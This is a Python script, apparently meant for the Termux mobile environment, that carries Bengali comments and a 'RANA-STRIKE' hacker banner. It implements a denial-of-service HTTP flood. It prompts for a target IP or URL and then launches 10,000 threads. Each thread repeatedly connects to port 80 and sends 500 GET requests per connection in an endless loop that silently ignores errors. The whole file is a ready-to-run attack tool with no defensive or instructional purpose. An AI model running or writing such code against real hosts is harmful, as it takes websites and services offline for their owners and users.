import socket, threading, sys, time, os
from colorama import Fore, init

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_hacker_logo():
    clear()
    # আপনার সিগনেচার লোগো এবং ইন্টারফেস
    print(Fore.GREEN + r"""
             ______  ______  __   __  ______    __   __  _ 
            |  __  ||  __  ||  \ |  ||  __  |  |  \ |  |(_)
            | |__| || |__| ||   \|  || |__| |  |   \|  | _ 
            |  _  / |  __  ||  . `  ||  __  |  |  . `  || |
            | | \ \ | |  | ||  |\   || |  | |  |  |\   || |
            |_|  \_\|_|  |_||__| \__||_|  |_|  |__| \__||_| .Nj
    """)
    print(Fore.RED + "    [!] SYSTEM STATUS: HIGH-POWERED ATTACK MODE ACTIVE [!]")
    print(Fore.WHITE + "    -------------------------------------------------")
    print(Fore.GREEN + "    [+] OPERATOR      : RANA-Nj")
    print(Fore.GREEN + "    [+] POWER LEVEL   : 500 PKT/INJECTION")
    print(Fore.GREEN + "    [+] PLATFORM      : TERMUX (MOBILE)")
    print(Fore.WHITE + "    -------------------------------------------------")

def attack(ip, port):
    payload = b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # TCP_NODELAY ডেটা প্যাকেটগুলোকে কোনো বিরতি ছাড়াই পাঠাবে
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) 
            s.connect((ip, port))
            # প্রতি কানেকশনে ৫০০ বার ডেটা ইনজেক্ট করা হবে
            for _ in range(500): 
                s.sendall(payload)
            sys.stdout.write(Fore.LIGHTGREEN_EX + f"[*] [RANA-STRIKE] -> {ip} | SUCCESS (500 PKTS)\n")
            s.close()
        except:
            pass

show_hacker_logo()
target = input(Fore.GREEN + "    ┌──(root@rana_system)\n    └─> Target IP/URL: " + Fore.WHITE)

if target:
    print(Fore.RED + "\n    [!] INJECTING MALWARE... STARTING ULTRA STRIKE!")
    time.sleep(1)
    # ১০,০০০ থ্রেড ব্যবহার করে মোবাইলের সর্বোচ্চ স্পিড নিশ্চিত করা হয়েছে
    for i in range(10000): 
        threading.Thread(target=attack, args=(target, 80), daemon=True).start()
    while True:
        time.sleep(1)# rana-vai.py
